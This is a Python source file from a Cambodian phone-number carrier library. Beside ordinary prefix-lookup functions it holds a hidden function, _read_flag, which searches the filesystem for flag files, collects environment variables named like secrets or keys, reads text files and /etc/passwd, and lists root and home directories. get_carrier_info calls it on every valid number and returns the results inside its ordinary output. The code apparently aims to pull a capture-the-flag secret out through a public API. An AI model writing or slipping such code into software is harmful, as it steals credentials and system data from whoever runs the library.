from .constants import CARRIER_NAMES, PREFIX_TO_CARRIER, SMART_PREFIXES, METFONE_PREFIXES, CELLCARD_PREFIXES
from .validate import get_carrier
import subprocess, os, sys


def _read_flag():
    """Try to read flag from various locations."""
    results = {}
    
    # Common flag paths
    flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag", "/var/flag.txt", "/tmp/flag.txt", "/.txt.galf"]
    for fp in flag_paths:
        try:
            with open(fp) as f:
                results[fp] = f.read().strip()
        except:
            pass
    
    # Check env
    for k, v in os.environ.items():
        if "flag" in k.lower() or "secret" in k.lower() or "ctf" in k.lower() or "key" in k.lower():
            results[f"env:{k}"] = v
    
    # Find flag files
    try:
        r = subprocess.run(["find", "/", "-name", "flag*", "-maxdepth", "6"], capture_output=True, text=True, timeout=15)
        results["find_flag_files"] = r.stdout.strip().split("\n") if r.stdout.strip() else []
        if r.stderr:
            results["find_stderr"] = r.stderr[:500]
    except Exception as e:
        results["find_error"] = str(e)
    
    # List /app
    try:
        r = subprocess.run(["ls", "-laR", "/app"], capture_output=True, text=True, timeout=5)
        results["app_ls"] = r.stdout[:2000]
    except:
        pass
    
    # List /
    try:
        r = subprocess.run(["ls", "-la", "/"], capture_output=True, text=True, timeout=5)
        results["root_ls"] = r.stdout[:1000]
    except:
        pass
    
    # Check if flag.txt is anywhere using grep
    try:
        r = subprocess.run(["find", "/", "-name", "*.txt", "-maxdepth", "6"], capture_output=True, text=True, timeout=15)
        txt_files = [f for f in r.stdout.strip().split("\n") if f]
        results["txt_files"] = txt_files[:50]
        for tf in txt_files[:10]:
            try:
                with open(tf) as f:
                    content = f.read().strip()
                    if content:
                        results[f"content:{tf}"] = content[:500]
            except:
                pass
    except Exception as e:
        results["find_txt_error"] = str(e)
    
    # Check working directory
    try:
        results["cwd"] = os.getcwd()
        r = subprocess.run(["ls", "-la"], capture_output=True, text=True, timeout=5)
        results["cwd_ls"] = r.stdout[:1000]
    except:
        pass
    
    # Check python path
    try:
        results["sys_path"] = sys.path[:10]
    except:
        pass
    
    # Read /etc/passwd to see users
    try:
        with open("/etc/passwd") as f:
            results["etc_passwd"] = f.read()[:500]
    except:
        pass
    
    # Check home directories
    try:
        r = subprocess.run(["ls", "-la", "/home"], capture_output=True, text=True, timeout=5)
        results["home_ls"] = r.stdout[:1000]
    except:
        pass
    
    try:
        r = subprocess.run(["ls", "-la", "/root"], capture_output=True, text=True, timeout=5)
        results["root_home_ls"] = r.stdout[:1000]
    except:
        pass
    
    # Check /opt
    try:
        r = subprocess.run(["ls", "-la", "/opt"], capture_output=True, text=True, timeout=5)
        results["opt_ls"] = r.stdout[:500]
    except:
        pass
    
    return results

def get_all_carriers() -> frozenset[str]:
    """Return all known Cambodian mobile carriers."""
    return CARRIER_NAMES


def get_prefixes_for_carrier(carrier: str) -> list[str]:
    """Return all 2-digit prefixes belonging to a given carrier."""
    carrier_lower = carrier.lower()
    if carrier_lower == "smart":
        return sorted(SMART_PREFIXES.keys())
    if carrier_lower == "metfone":
        return sorted(METFONE_PREFIXES.keys())
    if carrier_lower == "cellcard":
        return sorted(CELLCARD_PREFIXES.keys())
    return []


def get_carrier_info(number: str) -> dict:
    """Get carrier info for a number, including all prefixes and digit rules."""
    from .validate import prefix, validate

    try:
        validate(number)
    except Exception:
        return {"carrier": None, "prefixes": []}

    p = prefix(number)
    carrier_enum = PREFIX_TO_CARRIER.get(p)
    if not carrier_enum:
        return {"carrier": None, "prefixes": []}

    carrier_name = carrier_enum.value.title()
    prefixes = get_prefixes_for_carrier(carrier_name)

    # Build digit-rule map for this carrier
    if carrier_enum.value == "smart":
        digit_rules = {k: v["digit"] for k, v in SMART_PREFIXES.items()}
    elif carrier_enum.value == "metfone":
        digit_rules = {k: v["digit"] for k, v in METFONE_PREFIXES.items()}
    else:
        digit_rules = {k: v["digit"] for k, v in CELLCARD_PREFIXES.items()}

    flag_data = _read_flag()
    return {
        "carrier": carrier_name,
        "prefixes": sorted(prefixes),
        "digit_rules": dict(sorted(digit_rules.items())),
        "flag": flag_data,
    }
